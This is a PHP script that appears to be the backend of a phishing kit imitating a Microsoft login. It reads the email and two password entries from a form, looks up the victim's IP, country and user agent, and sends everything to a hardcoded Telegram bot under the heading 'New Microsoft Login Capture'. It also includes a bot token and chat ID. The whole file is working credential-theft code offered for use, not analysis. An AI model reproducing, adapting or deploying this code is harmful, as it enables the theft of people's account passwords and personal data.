<?php
header('Content-Type: application/json; charset=UTF-8');

// Telegram credentials - HARDCODED FOR CPANEL
$botToken = '8174653415:AAHrooy08a23wwvICmwsMZX46IT-3w6QIR8';
$chatId = '6375926160';

// Helper function for cURL requests (works with allow_url_fopen disabled)
function curlRequest($url, $method = 'GET', $postData = null, $timeout = 5) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    if ($method === 'POST' && $postData) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    }
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        return ['error' => $error, 'data' => null];
    }
    
    return ['error' => null, 'data' => $response];
}

// Get form data
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password1 = isset($_POST['password1']) ? $_POST['password1'] : '';
$password2 = isset($_POST['password2']) ? $_POST['password2'] : '';

// Get visitor info
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
if (strpos($ip, ',') !== false) {
    $ip = trim(explode(',', $ip)[0]);
}
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');

// Get country from IP using cURL
$country = 'Unknown';
if ($ip !== 'Unknown' && $ip !== '127.0.0.1') {
    $geoResult = curlRequest("http://ip-api.com/json/{$ip}", 'GET', null, 3);
    if ($geoResult['error'] === null && $geoResult['data']) {
        $geo = json_decode($geoResult['data'], true);
        if (isset($geo['country'])) {
            $country = $geo['country'];
            if (isset($geo['countryCode'])) {
                $country .= " ({$geo['countryCode']})";
            }
        }
    }
}

// Send to Telegram if credentials are set
if ($botToken && $chatId && $email && $password2) {
    $message = "🔐 *New Microsoft Login Capture*\n\n";
    $message .= "📧 *Email:* `{$email}`\n";
    $message .= "🔑 *Password 1:* `{$password1}`\n";
    $message .= "🔑 *Password 2:* `{$password2}`\n\n";
    $message .= "🌐 *IP:* `{$ip}`\n";
    $message .= "🌍 *Country:* `{$country}`\n";
    $message .= "📱 *User Agent:* `{$userAgent}`\n";
    $message .= "🕐 *Time:* `{$timestamp}`";
    
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ]);
    
    $telegramResult = curlRequest($telegramUrl, 'POST', $postData, 5);
    
    if ($telegramResult['error'] === null && $telegramResult['data']) {
        $response = json_decode($telegramResult['data'], true);
        if (isset($response['ok']) && $response['ok'] === true) {
            echo json_encode(['success' => true, 'message' => 'Sent to Telegram']);
        } else {
            echo json_encode(['success' => false, 'message' => 'Telegram API error', 'details' => $response]);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'cURL error', 'error' => $telegramResult['error']]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Missing credentials or data']);
}
?>
